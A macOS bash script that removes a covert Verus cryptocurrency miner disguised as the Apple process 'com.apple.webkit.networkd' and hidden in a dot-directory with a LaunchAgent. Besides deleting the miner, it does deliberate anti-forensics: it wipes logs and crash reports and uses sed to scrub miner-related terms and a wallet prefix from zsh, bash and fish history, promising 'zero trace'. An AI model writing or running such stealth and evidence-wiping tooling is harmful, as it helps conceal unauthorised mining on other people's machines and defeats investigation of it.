#!/usr/bin/env bash
# ============================================================
# remove_mine.sh — Complete zero-trace removal of Verus miner
# ============================================================

DISGUISE_NAME="com.apple.webkit.networkd"
INSTALL_DIR="$HOME/Library/Application Support/.wknd"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"

echo ""
echo "=========================================="
echo " Verus Miner — Full Removal"
echo "=========================================="
echo ""

# ---- 1. Kill process ----
echo "[1/7] Stopping miner process..."
if pkill -9 -f "$DISGUISE_NAME" 2>/dev/null; then
  echo "      ✓ Process killed"
else
  echo "      — Process was not running"
fi
pkill -9 -f "ccminer" 2>/dev/null || true
sleep 1

# ---- 2. Unload launchd job ----
echo "[2/7] Removing background launch job..."
if launchctl unload -w "$PLIST_PATH" 2>/dev/null; then
  echo "      ✓ LaunchAgent unloaded"
else
  echo "      — LaunchAgent was not loaded"
fi
launchctl remove "$DISGUISE_NAME" 2>/dev/null || true

# ---- 3. Delete plist ----
echo "[3/7] Deleting launch config file..."
if [[ -f "$PLIST_PATH" ]]; then
  rm -f "$PLIST_PATH"
  echo "      ✓ Deleted: $PLIST_PATH"
else
  echo "      — Not found: $PLIST_PATH"
fi

# ---- 4. Delete binary + build dir ----
echo "[4/7] Removing miner binary and build files..."
if [[ -d "$INSTALL_DIR" ]]; then
  rm -rf "$INSTALL_DIR"
  echo "      ✓ Deleted: $INSTALL_DIR"
else
  echo "      — Not found: $INSTALL_DIR"
fi

# ---- 5. Wipe logs ----
echo "[5/7] Wiping log files..."
if [[ -f "$LOG_PATH" ]]; then
  rm -f "$LOG_PATH"
  echo "      ✓ Deleted: $LOG_PATH"
else
  echo "      — No log file found"
fi
rm -f "$HOME/Library/Logs/${DISGUISE_NAME}"* 2>/dev/null || true

# ---- 6. Scrub shell history ----
echo "[6/7] Scrubbing shell history..."
SCRUBBED=0
for HIST_FILE in "$HOME/.zsh_history" "$HOME/.bash_history" "$HOME/.local/share/fish/fish_history"; do
  if [[ -f "$HIST_FILE" ]]; then
    for TERM in "mine\.sh" "remove_mine" "webkit\.networkd" "ccminer" "luckpool" "RSwiruL" "verus"; do
      sed -i '' "/$TERM/d" "$HIST_FILE" 2>/dev/null && SCRUBBED=1
    done
    echo "      ✓ Cleaned: $HIST_FILE"
  fi
done
[[ $SCRUBBED -eq 0 ]] && echo "      — No history files found"
history -c 2>/dev/null || true

# ---- 7. Remove crash reports ----
echo "[7/7] Removing crash reports..."
CRASH_COUNT=0
for DIR in "$HOME/Library/Logs/DiagnosticReports" "/Library/Logs/DiagnosticReports"; do
  if [[ -d "$DIR" ]]; then
    find "$DIR" \( -name "*ccminer*" -o -name "*webkit.networkd*" \) -delete 2>/dev/null && CRASH_COUNT=$((CRASH_COUNT+1))
  fi
done
[[ $CRASH_COUNT -gt 0 ]] && echo "      ✓ Crash reports cleaned" || echo "      — No crash reports found"

# ---- Final check ----
echo ""
echo "=========================================="
ISSUES=0
launchctl list 2>/dev/null | grep -q "$DISGUISE_NAME" && echo " [!] LaunchAgent still active!" && ISSUES=$((ISSUES+1))
[[ -d "$INSTALL_DIR" ]] && echo " [!] Install dir still exists!" && ISSUES=$((ISSUES+1))
[[ -f "$LOG_PATH" ]]    && echo " [!] Log file still present!"  && ISSUES=$((ISSUES+1))

if [[ $ISSUES -eq 0 ]]; then
  echo " ✓  Complete — Zero trace remaining."
else
  echo " [!] $ISSUES item(s) may need manual cleanup."
fi
echo "=========================================="
echo ""
